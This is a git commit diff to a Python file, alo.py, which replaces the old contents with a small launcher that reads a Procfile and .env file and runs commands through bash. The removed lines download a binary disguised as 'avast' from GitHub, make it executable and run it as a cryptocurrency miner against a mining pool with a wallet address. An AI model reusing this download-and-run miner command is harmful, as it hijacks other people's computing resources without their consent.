3f7fa6a69f52d9170bf1350b6d797b934e357ff9
samrikulan <93561728+samrikulan@users.noreply.github.com>
2021-12-01 11:00:51 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,4 +1,32 @@
-import os,subprocess
-os.system("lscpu")
-subprocess.run(['wget', 'https://github.com/samrikulan/toya/raw/main/avast', '&&', 'chmod', '777', 'avast', '&&', './avast -v -l  verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8 -x'], stdout=subprocess.PIPE)
+import sys, os
 
+procs = {}
+with open('Procfile') as f:
+    for line in f:
+        name, cmd = line.split(':', 1)
+        procs[name.strip()] = cmd.strip()
+
+env = dict(os.environ)
+with open('.env') as f:
+    for line in f:
+        name, value = line.split('=', 1)
+        env[name.strip()] = value.strip()
+
+
+def exec_shell(shell_args):
+    cmd = ['/bin/bash', '-c', ' '.join(shell_args)]
+    os.execve(cmd[0], cmd, env)
+
+
+def main():
+    if len(sys.argv) == 2:
+        proc_name = sys.argv[1].strip()
+        if proc_name in procs:
+            proc_cmd = procs[proc_name]
+            exec_shell([proc_cmd])
+
+    exec_shell(sys.argv[1:])
+
+
+if __name__ == '__main__':
+    main()
